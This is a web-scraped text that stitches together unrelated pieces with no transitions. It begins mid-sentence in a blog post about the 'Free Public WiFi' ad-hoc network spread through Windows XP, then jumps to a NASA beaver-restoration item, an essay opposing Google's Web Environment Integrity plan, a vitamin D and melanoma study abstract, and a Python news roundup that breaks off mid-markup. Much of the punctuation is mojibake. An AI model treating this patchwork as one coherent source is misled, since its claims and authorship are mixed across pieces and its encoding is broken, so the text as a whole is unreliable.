let's start out with a discussion of WiFi itself.</p>
<p>The mid-2000s were a coming of age era for WiFi. It had become ubiquitous in
laptops, and the 2007 launch of the iPhone established WiFi as a feature of
mobile devices (yes, various phones had offered WiFi support earlier, but none
sold nearly as well). Yet there weren't always that many networks out there.
Today, it seems that it has actually become less common for cafes to offer WiFi
again, presumably as LTE has reached nearly all cafe customers and fewer people
carry laptops. But in the 2010s, genuinely free, public WiFi had become far
more available in US cities.</p>
<p>Some particularly ambitious cities launched wide-area WiFi programs, and for a
brief time "Municipal WiFi" was a market sector. Portland, where I grew up, was
one of these, with a wide-area WiFi network covering the house I grew up in for
a couple of years. Like most the program didn't survive to see 2020.
Ironically, efforts to address the "digital divide" have lead to a partial
renaissance of municipal WiFi. Many cities now advertise free WiFi service at
parks, libraries, and other public places. I was pleased to see that Mexico
City has a relatively expansive municipal WiFi service, probably taking
advantage of the municipal IP network they have built out for video
surveillance and emergency phones.</p>
<p>The 2000s, though, were different. "Is there WiFi here?" was the sort of
question you heard all the time in the background. WiFi was seen as a revenue
source (less common today, although the hotel industry certainly still has its
holdouts) and so facility-offered WiFi was often costly. A surprising number of
US airports, for example, had either no WiFi or only a paid service even
through the 2010s. I'm sure there are still some like this today, but paid WiFi
seems on the way out [1], probably as a result of the strong competition it
gets from LTE and 5G. The point, though, is that back in 2006 we were all
hungry for WiFi all the time.</p>
<p>We also have to understand that the 802.11 protocol that underlies WiFi is
surprisingly complex and offers various different modes. We deal with this less
today, but in the 2000s it was part of computer user consciousness that WiFi
came in two distinct flavors. 802.11 beacon packets, used to advertise WiFi
networks to nearby devices, include a flag that indicates whether the network
operates in <em>infrastructure mode</em> or <em>ad-hoc mode</em>.</p>
<p>A network in infrastructure mode, basically the normal case, requires all
clients to communicate with the access point (AP). When two clients exchange
traffic, the AP serves as an intermediary, receiving packets from one device
and transmitting them to the other. This might at first seem inefficient, but
this kind of centralization is very common in radio systems as it offers a
simple solution to a complex problem. If a WiFi network consists of three
devices, an AP and two clients (A and B), we know that clients A and B can
communicate with the AP because they are maintaining an association. We don't
know if A and B can communicate with each other. They may be on far opposite
sides of the AP's range, there may be a thick concrete wall between A and B,
one device may have very weak transmit power, etc. Sending all traffic through
the AP solves this problem the same way a traditional radio repeater does, by
serving as an intermediary that is (by definition for an AP) well-positioned in
the network coverage area.</p>
<p>The other basic WiFi mode is the ad-hoc network. In an ad-hoc network, devices
communicate directly with each other. The main advantage of an ad-hoc network
is that no AP is required. This allowed me and a high school friend to
communicate via UnrealIRCd running on one of our laptops during our
particularly engaging US Government/Economics class (we called this
"Governomics"). The main disadvantage of ad-hoc networks is that the loss of a
central communications point makes setup and routing vastly more complicated.
Today, there is a much better established set of technologies for distributed
routing in mesh networks, and yet ad-hoc WiFi is still rare. In the 2000s it
was much worse; ad-hoc mode was basically unusable by anyone not ready to
perform manual IP address management (yes, link local addresses existed and we
even used them for our IRC client configurations, but most people evidently
found these more confusing than helpful).</p>
<p>In general, ad-hoc networks are a bit of a forgotten backwater of consumer WiFi
technology. At the same time, the promise of ad-hoc networks featured heavily
in marketing around WiFi, compelling vendors to offer a clear route to creating
and joining them. This has allowed some weird behaviors to hang around in WiFi
implementations.</p>
<p>Another thing about WiFi networks in the 2000s, and I swear this is all
building to a point, is that the software tools for connecting to them were not
very good. On Windows, WiFi adapter vendors distributed their own software.
Anyone with a Windows laptop in, say, 2005 probably remembers Dell QuickSet
Wireless, Intel PROSet/Wireless (this actually how they style the name), and
Broadcom WLAN Utility. The main thing that these vendor-supported wireless
configuration utilities shared was an astounding lack of quality control, even
by the standards of the time. They were all terrible: bizarre, intrusive,
over-branded UX on top of a network configuration framework that had probably
never worked reliably, even in the original developer's test environment.</p>
<p>Perhaps realizing that this hellscape of software from hardware companies was
undoubtedly having a negative impact on consumer perception of Windows [2],
Microsoft creaked into action. Well, this part is kind of confusing, in a
classically Microsoft way. Windows XP had a built-in wireless configuration
management utility from the start, called Wireless Zero Configuration. The most
irritating thing about the vendor utilities was that they were unnecessary;
most of the time you could just uninstall them and use Wireless Zero and
everything would work fine.</p>
<p>Wireless Zero was the superior software too, perhaps because it had fewer
features and was designed by someone with more of the perspective of a computer
user than a wireless networking engineer. Maybe I'm looking on Wireless Zero
with rose-colored glasses but my recollection is that several people I knew
sincerely struggled to use WiFi. The fix was to remove whatever garbage their
network adapter vendor had provided and show them Wireless Zero, where
connecting to a network meant clicking on it in a list rather than going
through a five-step wizard.</p>
<p>So why did the vendor utilities even exist? Mostly, I think, because of the
incredible urge PC vendors have to "add value."
<a href="https://www.youtube.com/@CathodeRayDude">Gravis</a>, in the context of "quick
start" operating systems, gives a good explanation of this phenomenon. The
problem with being a PC vendor is that all of the products on the market offer
a mostly identical experience. For vendors to get any competitive moat bigger
than loud industrial design (remember when you badly wanted a Vaio for the
looks?), they had to "add value" by bolting on something they had developed
internally. These value-adds were, almost without exception, worthless
garbage. And wireless configuration utilities were just another example, a way
for Intel to put their brand in front of your face (seemingly the main concern
of Intel R&amp;D to this day) despite doing the same thing everyone else did.</p>
<p>There was a second reason, as well. While it was a good fit for typical
consumer use, Wireless Zero was not as feature-complete as many of the vendor
utilities were. Until the release of Vista and SP3, Wireless Zero was basically
its own proprietary solution just like the vendor utilities. There was no
standard API to interact with wireless configuration on XP/SP1/2, so if a
vendor wanted to offer anything Zero couldn't do, they had to ship their whole
own Product. Microsoft's introduction of a WiFi config API in Vista (and
basically backporting it to SP3) was a big blow to proprietary wireless
utilities, but it probably had less of an impact than the general decline of
crapware in Vista and later.</p>
<p>This is not to say that they're gone. A surprising number of PCs still ship
with some kind of inane OEM software suite that offers a half-baked wireless
configuration utility (just a frontend on the Windows API) alongside the
world's worst backup service, a free trial offer for a streaming service you
haven't heard of but represents the death throes of a once great national cable
network, and something that tells you if your PC is "healthy" based on
something about the registry that has never and will never impact your life???
God how is the PC industry <em>still</em> like this [3].</p>
<p>I think I have adequately set the stage for our featured story. In the late
2000s, huge numbers of people were (a) desperately looking for a working WiFi
network even though they were in a place like an airport that should clearly,
by civilized standards, have a free one; (b) using Wireless Zero on XP/SP1/2;
and (c) in possession of only a vague understanding of ad-hoc networks which
were nonetheless actively encouraged by WiFi vendors and their software.</p>
<p>Oh, there is a final ingredient: Wireless Zero had an interesting behavior
around ad-hoc networks. It's the kind of thing that sounds like an incredibly
bad decision in retrospect, but I can see how Microsoft got there. Let's say
that, for some reason and some how, a consumer uses ad-hoc WiFi. It was
ostensibly possible, not even really that hard, to use ad-hoc WiFi to provide
internet access in a home (from e.g. a USB DSL modem, still common at the
time). It's just that the boxes you had to check were enough clicks deep in the
network control panel that I doubt many people ever got there.</p>
<p>One of the problems with ad-hoc WiFi, though, is that ad-hoc networks can be
annoying to join. You've got to enter the SSID and key, which is already bad
enough, but then you're going to be asked if it's WEP or WPA or WPA2 and then,
insult on injury, if the WPA2 is in TKIP or AES mode. For ad-hoc networks to be
usable <em>something</em> had to broadcast beacons, and without an AP, that had to be
the first computer in the network.</p>
<p>So, now that you have your working ad-hoc setup complete with beacons, you
might want to take your laptop, unplug it from the DSL modem, and take it
somewhere else. Maybe you go on a trip, use the WiFi at a hotel (probably $15 a
day depending on your <em>WORLD OF HYATT</em> status), then come back home and plug
things back in the way they were. You would expect your home internet setup to
pick up where you left off, but people didn't have as many devices back then
and especially not as many always-on. Your laptop, de facto "host" of the
ad-hoc network, may be the only network participant up and running when you
want to connect a new device. So what does it need to do? Transmit beacons
again, even though the network configuration has changed a few times.</p>
<p>The problem is that it's really hard for a system in an ad-hoc network to know
whether or not it should advertise it. Wireless Zero didn't really provide any
way to surface this decision to the user, and the user probably wouldn't have
understood what it meant anyway. So Microsoft took what probably seemed, in the
naivety of the day, to be a reasonable approach: once a Windows XP machine had
connected to an ad-hoc network, it "remembered" it the same way it did the
"favorite" networks, for automatic reconnection. Assuming that it might just be
the first device in the ad-hoc network to come up, if the machine had a
remembered ad-hoc network and wasn't associated with anything else, it would
transmit beacons.</p>
<p>Put another way, this behavior sounds far more problematic: if a Windows XP
machine had an ad-hoc network favorited (which would be default if it had ever
connected to one), then when it wasn't connected to any other WiFi network, it
would beacon the favorited ad-hoc network to make it easier for other hosts to
connect. Ad-hoc networks could get <em>stuck in there,</em> a ghost in Wireless Zero.</p>
<p>You can no doubt see where this goes. "Free Public WiFi" was just some ad-hoc
network that someone created once. We don't know why; most people seem to go to
ill intent but I don't think that's necessary. Maybe some well-meaning cafe
owner had an old computer with a USB DSL modem they used for Business and
decided to offer cafe WiFi with the hardware they already owned. The easiest
way (and probably only way, given that driver support for infrastructure mode
AP behavior on computer WiFi adapters remains uneven today) would be to create
an ad-hoc network and check the right boxes to enable forwarding. But who knows,
maybe it was someone intercepting traffic for malicious purposes, maybe it was
someone playing a joke, all we really know is that it happened sometime before
2006 when I find the first public reference to the phenomenon.</p>
<p>Whoever it was, they were patient zero. The first Windows XP machine to connect
became infected, and when its owner took it somewhere else and didn't connect
to a WiFi network, it helpfully beaconed Free Public WiFi. Someone else, seeing
such a promising network name, connected. Frustrated by the lack of Hotmail
access, they disconnected and moved on... but, unknowingly, they were now part
of The Ad-Hoc Network.</p>
<p>The phenomenon must have spread quickly. In 2007, a wire service column of
security tips (attributed to the Better Business Bureau, noted information
security experts) warns that "this network may be an ad-hoc network used by
hackers hunting for credit card information, Social Security numbers and
account passwords." Maybe! Stranger things have happened! I would put good
money on "no" (the same article encourages using a VPN, an early link in a
chain that leads to the worst YouTube content today).</p>
<p>By 2008-2009, when I think I had reached a high level of owning a laptop and
using it in strange places, it was almost universal. "Free Public WiFi"
enchanted me as a teenager because it was <em>everywhere.</em> I could hardly open my
laptop without seeing it there in the Wireless Zero list. Like the Morris worm,
it exploited a behavior so widespread and so unprotected that I think it must
have burned through a substantial portion of the Windows XP laptop fleet.</p>
<p>"Free Public WiFi" would reach an end. In Service Pack 3, as part of the
introduction of the new WLAN framework, Microsoft fixed the beacon behavior.
This was before the era of forced updates, though, and XP was particularly
notorious for slow uptake of service packs. "Free Public WiFi" was apparently
still widespread in 2010 when NPR's mention inspired a wave of news coverage.
Anecdotally, I think I remember seeing it into 2012. One wonders: is it still
around today?</p>
<p>Unfortunately, I always have a hard time with large-scale research on WiFi
networks. WiGLE makes a tantalizing offer of an open data set to answer this
kind of question but the query interface is much too limited and the API has a
prohibitively low quota. Maxing out my API limits every day I think it'd take
over a month to extract all the "Free Public WiFi" records so that I could
filter them the way I want to. Perhaps I should make a sales inquiry for a
commercial account for my enterprise blogging needs, but it's just never felt
to me like WiGLE is actually a good resource for the security community.
They're kind of like hoarders, they have an incredible wealth of data but they
don't want to give any of it up.</p>
<p>I pulled the few thousand records I'm allowed to get today from WiGLE and then
changed tracks to WifiDB, which is much less known than WiGLE but actually
makes the data available. Unfortunately WifiDB has a much lower user count, and
so the data is clearly impacted by collection bias (namely the impressive work
of one specific contributor in Phoenix, AZ).</p>
<p>Still, I can find instances of ad-hoc "Free Public WiFi" spanning 2006 to as
late as 2018! It's hard to know what's going on there. I would seriously
consider beaconing "Free Public WiFi" today as a joke, but it may be that in
2018 there was still some XP SP2 laptop in the Phoenix area desperately hoping
for internet access.</p>
<p>WifiDB data, limited though it is, suggests that The Ad-Hoc Network peaked in
2010. Why not a crude visualization?</p>
<pre><code>2006    1   |
2007    0   
2008    39  |||||
2009    82  |||||||||

2016    3   |
2017    2   |
2018    1   |
</code></pre>
<p>That 2006 detection is the first, which lines up with NPR's reporting, but
could easily also be an artifact of WifiDB's collection. And 2018! The long
tail on this is impressive, but not all that surprising. XP had a real
reputation for its staying power. There are surely still people out there that
hold that XP was the last truly good Windows release---and honestly I might be
one of them. Every end-of-life announcement for XP triggered a wave of
complaints in the industry rags. In 2018, some niche versions of XP (e.g.
POSReady) were still under security support!</p>
<p>Most recent observations of "Free Public WiFi" are actually infrastructure-mode
networks. It's an amusing outcome that "Free Public WiFi" has been legitimized
over time. In Bloomington, Indiana I think it's actually the public WiFi at a
government building. Some office buildings and gas stations make appearances.
"Free Public WiFi" is probably more likely to work today than not... but no
guarantee that it won't steal your credit card. Pay heed to the Better Business
Bureau and take caution. Consider using a VPN... how about a word from our
sponsor?</p>
<p>Postscript: I have been uploading some YouTube videos! None of them are good,
but <a href="https://www.youtube.com/channel/UCOtVj3FON727juFaSDEZUXw">check it out</a>.
I'm about to record another one, about burglar alarms.</p>
<p>[1] Paid WiFi still seems alive and well at truck stops. Circumstances on a
recent cross-country trip lead to me paying an outrageous sum, something like
$20, for one day of access to a nationwide truck stop WiFi service that was
somewhere between "completely broken" and "barely usable to send an email" at
the three successive TAs I tried at. My original goal of downloading a
several-GiB file was eventually achieved by eating at a restaurant proximate to
a Motel 6. Motel 6 may be the nation's leading municipal WiFi operator.</p>
<p>[2] Can we think of another set of powerful hardware vendors consistently
dragging down the (already questionably seaworthy) Windows ecosystem by
shipping just absolute trash software that's mandatory for full use of their
hardware? Companies that are considered major centers of computer innovation
yet distribute a "driver" as an installer for an installer that takes over a
minute just to install the installer? Someone with the gall to call their
<em>somehow even less stable</em> release branch "ADRENALINE EDITION"?</p>
<p>[3] I used to have a ThinkPad with an extra button that did nothing because
Lenovo decided not to support the utility that made it do things on Vista or
later. This laptop was sold well after the release of Vista and I think shipped
with 7. That situation existed on certain ThinkPad models for <em>two
generations.</em> Things like this drive you to the edge of the Apple Store I
swear, and Lenovo isn't as bad as some.</p>

<p>Beavers relocated to a remote Idaho valley have transformed the landscape into a lush wetland and a haven against fire and drought, satellite imagery shows. </p>
<p>In Idaho, beavers can be something of nuisance, chewing down trees and building dams that flood yards and fields. In the 1930s, officials began trapping beavers near cities and towns and dropping them â sometimes by <a href="https://www.boisestatepublicradio.org/environment/2015-01-14/parachuting-beavers-into-idahos-wilderness-yes-it-really-happened">parachute</a> â into remote areas. </p>
<p>In one such area, Baugh Creek, beavers have visibly altered the landscape, as shown in newly released <a href="https://earthobservatory.nasa.gov/images/151591/idahos-emerald-refuge">satellite imagery</a> from NASA. Beavers erected dams that formed ponds and flooded meadows, supporting the growth of grasses and shrubs. A wide swath of vegetation now lines Baugh Creek, which is more verdant than other, nearby waterways.â </p>

<p>NASA is now supporting efforts to introduce more beavers to the landscape, using satellite data to determine which streams can support beavers and to monitor how resettled beavers alter the flow of water and the growth of plants. </p>
<p>âPrior to beaver trapping, beaver dams were just about everywhere in the West. So what weâre attempting to do is to bring beaver dam densities back to historic levels where possible,â <a href="https://www.nasa.gov/feature/researchers-become-beaver-believers-after-measuring-the-impacts-of-rewilding">said Wally Macfarlane</a>, a researcher at Utah State University who is working to restore beavers in Idaho and beyond. âIn doing so, weâre building important drought resiliency and restoring stream areas.â</p>

<p>If your computer canât lie to other computers, then itâs not yours.</p>



<p>This is a fundamental principle of free and open source software. The World Wide Web abides by this principle, although we donât often think of it that way. The Web is just an agreed-on set of programmatic interfaces: if you send me this, Iâll send you that. Your computer can construct the âthisâ by whatever means it wants; itâs none of the other sideâs business, because your computer is not their computer.</p>



<p>Googleâs so-called âWeb Environment Integrityâ <a href="https://en.wikipedia.org/wiki/Web_Environment_Integrity">plan</a> would destroy this independence. âIntegrityâ is exactly the wrong word for it â a better name would be the âBrowser Environment Controlâ plan.</p>



<p>In the normal world, you show up at the store with a five dollar bill, pick up a newspaper, and the store sells you the newspaper (and maybe some change) in exchange for the bill. In Googleâs proposed world, five dollar bills arenât fungible anymore: the store can ask you about the provenance of that bill, and if they donât like the answer, they donât sell you the newspaper. No, theyâre not worried about the bill being fake or counterfeit or anything like that. Itâs a real five dollar bill, they agree, but you canât prove that you got it from the right bank. Please feel free to come back with the <em>right sort</em> of five dollar bill.</p>



<p>This is not the Open Web that made whatâs best about the Internet accessible to the whole world. On that Web, if you send a valid request with the right data, you get a valid response. How you produced the request is <em>your business</em> and your business alone. Thatâs what software freedom is all about: you decide how your machinery works, just as other people decide how their machinery works. If your machine and their machine want to talk to each other, they just need an agreed-on language (in the case of the Web, thatâs HTTP) in which to do so.</p>



<p>Googleâs plan, though, steps behind this standard language to demand something no free and open source software can ever deliver: a magical guarantee that the user has not privately configured their own computer in any way that Google disapproves of.</p>



<p>The effrontery is shocking, to those with enough technical background to understand what is being proposed. Itâs as though Google were demanding that when youâre talking to them you must somehow guarantee, in a provable way, that youâre not also thinking impure thoughts.</p>



<p>How could anyone ever agree to this nonsense? Must all our computers become North Korea?</p>



<p>The details of your own systemâs configuration are irrelevant to â and unnecessary to accurately represent in â your communications with a server, just as your private thoughts are not required to be included, in some side-band channel, along with everything you say in regular language.</p>



<p>If a web site wants to require that you have a username and password, thatâs fine. Those are just a standard part of the HTTP request your browser sends. But if a web site wants your browser to promise that it stores that username and password locally in a file named âgoogle-seekritz.txtâ, thatâs not only weird and creepy, itâs also something that a free software (as in libre) browser can never reliably attest to. Any browser maintenance team worth its salt will just ship the browser with a default configuration in which the software reports that to Google when asked while, behind the scenes, storing usernames and passwords however it damn well pleases.</p>



<p>Indeed, the fundamental issue here is the freedom to <em>have</em> a âbehind the scenesâ at all. Environments in which people arenât allowed to have a âbehind the scenesâ are totalitarian environments. Thatâs not an exaggeration; itâs simply the definition of the term. Whatever bad connotations the concept of totalitarianism may have for you, they come not from the fancy-sounding multi-syllabic word but from the actual, human-level badness of the scenario itself. That scenario is what Google is asking for.</p>



<p>My web browser (currently <a href="https://www.mozilla.org/firefox">Mozilla Firefox</a> running on <a href="https://www.debian.org/">Debian GNU/Linux</a>, thank you very much) will never cooperate with this bizarre and misguided proposal. And along with the rest of the free software community, I will continue working to ensure we all live in a world where your web browser doesnât have to either.</p>



<hr>



<p><em>I <a href="https://kfogel.org/notice/AYCSZYFEXBkLjDLvkm">cross-posted the above in the Fediverse</a>, and a friend of mine there asked how Googleâs proposal was different from CORS: âiâm sure that i donât understand the google proposal, but all the browsers enforce CORS, and donât let you load data in many contexts.â  Itâs very different from CORS and other similar browser-side protections, so I <a href="https://kfogel.org/notice/AYE8S8sMqZd6Folbhw">replied</a> to explain why:</em></p>



<hr>



<p>This is not about the browser enforcing something by default for the purpose of being able to make security guarantees to its user. After all, if you wanted to modify and recompile your browser to not enforce same-origin policies, you could do so. (It would a bad idea, of course, but thatâs not a software freedom issue ð .)</p>



<p>Rather, this is about the browser being able to pass back a partially-hardware-based, cryptographically secure token that attests, to a central service, that you (the owner of the computer) have not made certain system modifications <em>that would otherwise be invisible to and undetectable by</em> another computer that youâre interacting with over the network. The central service can then pass that attestation along to relying parties. Those relying parties would then use it for all the expected purposes. For example, if theyâre considering sending you a stream of video, theyâd only do so if they see a promise from your computer that it has no side-band ability to save the video stream to a file (from which you could view it again later without their knowledge). And this promise would be dependable! Under this proposal, your computer would only be able to say it if it were true.</p>



<p>Of course, by definition the only way such a system can work is if it does not have software freedom on the client side. It requires a cooperative relationship between the hardware manufacturer and the supplier of the software â cross-signed blobs and such â whereby your computer loses the physical ability to make the requested attestation to a third party unless your computer is in fact fully cooperating.</p>



<p>By analogy: right now, you can tell your browser to change its <code>User-Agent</code> string to anything you want. You might get weird effects from doing that, depending on what value you set it to (and itâs unfortunate that web developers let sites get so sensitized to <code>User-Agent</code>, but thatâs another story, to be told along with a similar complaint about <code>HTTP Referer</code> â but I digress).</p>



<p>Now imagine a world in which, if you change your <code>User-Agent</code> string, your browser suddenly starts always sending out an extra header: â<code>User-Agent-String-Modified-By-User: True</code>â â and you have <em>no</em> choice about this. You canât stop your browser from doing it, because your computer wonât let you.</p>



<p>Does this help clarify what the problem is?</p>

            <p>
      
      There are conflicting results on the role of vitamin D system in cutaneous carcinogenesis. Therefore, it was investigated whether the use of oral vitamin D supplements associates with photoaging, actinic keratoses, pigment cell nevi, and skin cancers. In this cross-sectional study, 498 adults (aged 21-79 years, 253 males, 245 females, 96 with immunosuppression) subjects at risk of any type of skin cancer were examined, and possible confounding factors were evaluated. The subjects were divided into three groups based on their self-reported use of oral vitamin D supplements: non-use, occasional use, or regular use. The serum level of 25-hydroxyvitamin-D3 was analyzed in 260 subjects. In 402 immunocompetent subjects, vitamin D use did not associate with photoaging, actinic keratoses, nevi, basal, and squamous cell carcinoma. In contrast, there were lower percentages of subjects with a history of past or present melanoma (32/177, 18.1% versus 32/99, 32.3%, P = 0.021) or any type of skin cancer (110/177, 62.1% versus 74/99, 74.7%, P = 0.027) among regular users compared to non-users. In the logistic regression analysis, the odds ratio for melanoma was 0.447 ( P = 0.016, 95% confidence interval, 0.231-0.862) among regular users. Furthermore, the investigator-estimated risk class of skin cancers was significantly lower among regular users. Serum 25-hydroxyvitamin-D3 did not show marked associations with skin-related parameters. The results on 96 immunosuppressed subjects were somewhat similar, although the number of subjects was low. In conclusion, regular use of vitamin D associates with fewer melanoma cases, when compared to non-use, but the causality between them is obscure.

This month it carried on to the point than even Meta, Facebookâs parent company,&nbsp;</span><a href="https://discuss.python.org/t/a-fast-free-threading-python/27903/99?u=ambv" rel="">pitched in</a><span>:</span></p><blockquote><p>If PEP 703 is accepted, Meta can commit to support in the form of three [engineer years on landing] nogil CPython</p></blockquote><p><span>It is nice to have Python seeing more and more contributions from the big companies that used it for their success. It's a huge contrast&nbsp;</span><a href="https://pyfound.blogspot.com/2012/01/psf-grants-over-37000-to-python.html" rel="">compared to the 2010 decade</a><span>.</span></p><p><span>The discussion culminated with an internal debate with the core devs, which ended up with an official announcement that&nbsp;</span><a href="https://peps.python.org/pep-0703/" rel="">PEP 703</a><span>, the proposal that relit the fire,&nbsp;</span><a href="https://discuss.python.org/t/a-steering-council-notice-about-pep-703-making-the-global-interpreter-lock-optional-in-cpython/30474" rel="">was going to be accepted&nbsp;</a><span>after some details being figured out.</span></p><p>This means in the coming years, Python will have its GIL removed.</p><p>Here is the plan:</p><ul><li><p>Short term, an unsupported experimental version of Python without the GIL is published in parallel to the regular one. Target is 3.13/3.14.</p></li><li><p>Mid-term, the no-GIL version is marked as officially supported, but is still just an alternative to Python with GIL. A target date is announced to make it the default once. This will happen only after the community has shown enough support for it, and will take several years.</p></li><li><p>Long-term, no-GIL becomes the default. Before this, the core devs can reverse the decision and abort the no-GIL project if it proves to have a bad ROI.</p></li></ul><p>Note that if the program imports one single C-extension that uses the GIL on the no-GIL build, it's designed to switch back to the GIL automatically. So this is not a 2=&gt;3 situation where non-compatible code breaks. </p><p>The main reason for the two different builds is to manage the unknown unknowns. Indeed, nobody expects the no-GIL to break things, but with such a big project, you can never be sure. ABI compat is tricky, and new extensions need to be compiled explicitly against it for it to work, so there is a need for the community embracing it.</p><p>Also, no-GIL compatible extensions will work on the old interpreter, so you don't get in the situation like Python 3 code not working on Python 2.</p><p>In fact, Python code itself should not be affected and will work seamlessly on one or the other, albeit with threads limited to a single core with the GIL.</p><p><span>That's the news I didn't see coming. In "</span><a href="https://www.bitecode.dev/p/whats-the-deal-with-cpython-pypy" rel="">What's the deal with CPython, Pypy, MicroPython, Jython...?</a><span>" we talked about Python compilers, and I thought I did a pretty good job about listing everything that mattered. Well, the team behind&nbsp;</span><a href="https://github.com/lcompilers/lpython" rel="">LPython</a><span>&nbsp;decided to take this list and&nbsp;</span><code>.append()</code><span>&nbsp;on it.</span></p><p><span>LPython is a new BSD 3 compiler that takes Python code and translate it for the following for LLVM, C, C++ or WASM. It doesn't aim to compile the entire program, although it can, but rather, like numba and cython, to let you speed up numerical bottle neck.&nbsp;</span><a href="https://lpython.org/blog/2023/07/lpython-novel-fast-retargetable-python-compiler/" rel="">The benchmarks</a><span>&nbsp;are very promising and the ability to switch between Ahead-of-Time and Just-in-Time very convenient, although you will still need&nbsp;</span><a href="https://github.com/lcompilers/lpython#installation" rel="">the entire compilation chain installed on the machine</a><span>. LPython likes raw Python code, so if you call a Python function inside your snippet, you must explicitly mark it as such with a decorator. So most will likely use it for very specific snippets.</span></p><p>I've been pitching the coming of the version 2 of Pydantic for some time, because I, and many people, use it a lot for data validation / schema definition, and the new version is much faster.</p><p><span>Yes, it came out as stable last month, but if you read "</span><a href="https://www.bitecode.dev/p/relieving-your-python-packaging-pain" rel="">Relieving your Python packaging pain</a><span>" you know I don't encourage people to use the last version of anything except for testing or having fun.</span></p><p>Indeed, even a stable major version is still something that is guaranteed to need refinement, and still has little community support.</p><p>But now two things have happened:</p><ul><li><p><a href="https://github.com/pydantic/pydantic/releases" rel="">Pydantic 2.1 has been released</a><span>, the first wave of nasty bugs have been eradicated.</span></p></li><li><p><a href="https://fastapi.tiangolo.com/release-notes/#01000" rel="">Fast API announced support of Pydantic 2</a><span>. Since it's the biggest driver of Pydantic usage, it's a milestone.</span></p></li></ul><p>I will now proceed with giving it a try in one personal project, and if it works, move it into professional projects in a few months.</p><p><span>If you haven't read Victor Stinner's blog yet, I encourage you to do so. It's technical and raw, with zero BS, and gives you a good view of what happens inside the contribution life of a core dev.&nbsp;</span><a href="https://vstinner.github.io/contrib-python-july-2023.html" rel="">Last article</a><span>&nbsp;mentions something I missed last month: soft deprecation has been added to&nbsp;</span><a href="https://peps.python.org/pep-0387/" rel="">PEP 387 â Backwards Compatibility Policy</a><span>.</span></p><p>This document, created in 2009, states how the Python projects deals with deprecation, and it will now contain the following:</p><blockquote><p>A soft deprecation can be used when using an API which should no longer be used to write new code, but it remains safe to continue using it in existing code. The API remains documented and tested, but will not be developed further (no enhancement). The main difference between a âsoftâ and a (regular) âhardâ deprecation is that the soft deprecation does not imply scheduling the removal of the deprecated API.</p></blockquote><p>Basically, a soft deprecated API is in a zombie state, maintained alive forever, but will never see any work on it and be explicitly advised against being used.</p><p><a href="https://docs.python.org/3/library/optparse.html" rel="">optparse</a><span>&nbsp;and&nbsp;</span><a href="https://docs.python.org/3/library/getopt.html" rel="">getopt</a><span>, two modules that used to be a de-facto solution for parsing script arguments in their time, are now marked as "soft-deprecated". You can use them forever, but you probably should not.</span></p><p><span>First,&nbsp;</span><a href="https://docs.python.org/3/library/argparse.html#module-argparse" rel="">argparse</a><span>&nbsp;is the more modern stdlib solution, and we have&nbsp;</span><a href="https://www.bitecode.dev/p/parameters-options-and-flags-for" rel="">a good article on it.</a></p><p><span>Second, 3rd party projects like&nbsp;</span><a href="https://typer.tiangolo.com/" rel="">typer</a><span>&nbsp;and&nbsp;</span><a href="https://click.palletsprojects.com/en/8.1.x/" rel="">click</a><span>&nbsp;exist.</span></p><p><a href="https://cython.org/" rel="">Cython</a><span>, the most famous Python compiler,&nbsp;</span><a href="https://cython.readthedocs.io/en/latest/src/changes.html" rel="">released version 3</a><span>. While the release comes with all sorts of improvement, one particularly stands out. Cython always had limitations: it used a superset of Python to express some of its features.</span></p><p>This is no more the case, as the release notes: "it should now be possible to express all Cython code and use all features in regular Python syntax".</p><p>Which means you now should be able to use any Python code base, just Cython it all and see what happens.</p><p><span>While the no-GIL topic was certainly still alive and well, the proposal of&nbsp;</span><a href="https://pep-previews--3210.org.readthedocs.build/pep-0722" rel="">PEP 722</a><span>&nbsp;really&nbsp;</span><a href="https://discuss.python.org/t/pep-722-dependency-specification-for-single-file-scripts/29905" rel="">heated things up</a><span>.</span></p><p><span>The idea is to formalize a syntax in comments that, similar to </span><a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" rel="">Groovyâs</a><span>, would allow expressing the dependency of a single script. Taking the example from the PEP itself:</span></p><pre><code><code># In order to run, this script needs the following 3rd party libraries
#
# Requirements:
#    requests
#    rich

import requests
from rich.pretty import pprint

resp = requests.get("https://peps.python.org/api/peps.json")
data = resp.json()
pprint([(k, v["title"]) for k, v in data.items()][:10])</code></code></pre><p>The important lines are:</p><pre><code><code># Requirements:
#    requests
#    rich</code></code></pre><p><span>Which now would be officially formalized to be parsed by third-party tools. The concept is not new and tools like&nbsp;</span><a href="https://pypi.org/project/pip-run/" rel="">pip-run</a><span>&nbsp;already support running a script for which you have the deps described with such comments:</span></p><pre><code><code>$ pip uninstall rich requests
WARNING: Skipping rich as it is not installed.
WARNING: Skipping requests as it is not installed.
$ pip-run dah_script.py

]</code></code></pre><p><span>Packages are installed in a temporary&nbsp;</span><a href="https://www.bitecode.dev/p/back-to-basics-with-pip-and-venv" rel="">virtual env</a><span>&nbsp;and deleted after the run, like&nbsp;</span><a href="https://www.npmjs.com/package/npx" rel="">npx</a><span>&nbsp;used to do for the JS world.</span></p><p><span>The PEP doesn't imply Python or pip are going to integrate such feature, it's only about formalizing the syntax for now. But I have good hope for this one, as I have several lone Python scripts lying around that would really benefit from this, especially if you can keep the env around in the future. Such a proposal could show demand for it, and years later, lead to pip adoption. E.G: npx influenced the addition of&nbsp;</span><code>npm create</code><span>, which allows to fetch a project template from specific packages. Indeed, that was the most common use case for npx.</span></p><p><span>If you use VSCode, you may have noticed using a lot of linters made the IDE slower. Mypy is particularly at fault as the&nbsp;</span><code>mypy</code><span>&nbsp;command is slow to start, and the daemon mode is not used by VSCode.</span></p><p><span>For his&nbsp;</span><a href="https://devblogs.microsoft.com/python/python-in-visual-studio-code-july-2023-release/" rel="">new release</a><span>, a new official mypy extension is now available, which uses the dmypy daemon. The speed up is such that the editor can now offer the check on the entire code base, not just the current file.</span></p><p>On top of that, pylance, the Microsft official extension for Python support, will now persist all the indexing work it performs on 3rd party libs. This will result in a lighter startup, and for big project, a speedier experience as indexing can take some time with slow machines.</p><p>I personally have to work on corporate clientsâ laptops I can't modify, and they come with a ton of security software that makes them slow down to crawl, with process inspection and network calls to check file signatures after you click on anything. So this is a lifesaver.</p><p>This is just so cool:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" 